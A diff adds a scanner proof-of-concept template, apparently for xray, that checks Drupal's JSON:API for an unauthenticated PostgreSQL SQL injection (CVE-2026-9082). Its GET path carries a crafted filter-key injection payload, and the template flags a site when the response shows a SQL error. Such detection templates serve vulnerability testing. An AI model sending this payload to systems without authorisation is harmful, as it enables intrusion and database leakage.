@@ -1,0 +1,17 @@
+name: poc-yaml-drupal-jsonapi-postgresql-sqli
+groups:
+  sqli:
+    - method: GET
+      path: /jsonapi/node/article?filter[0][condition][path]=title&filter[0][condition][value][test_)=1]=test
+      follow_redirects: false
+      expression: >
+        response.status == 500 && (response.body.bcontains(b"SQLSTATE[HY093]") || response.body.bcontains(b"Invalid parameter number") || response.body.bcontains(b"number of bound variables does not match"))
+detail:
+  author: L4xy
+  description: "Drupal Core存在PostgreSQL SQL注入漏洞，攻击者无需身份验证，通过JSON:API的filter参数注入恶意SQL，可导致数据库信息泄露。仅影响PostgreSQL后端的Drupal站点"
+  links:
+    - https://github.com/dinosn/drupal-sa-core-2026-004-lab/blob/main/README.md
+    - https://www.drupal.org/sa-core-2026-004
+    - https://github.com/7h30th3r0n3/CVE-2026-9082-Drupal-PoC
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-9082
+  tags: sqli,drupal,postgresql,jsonapi
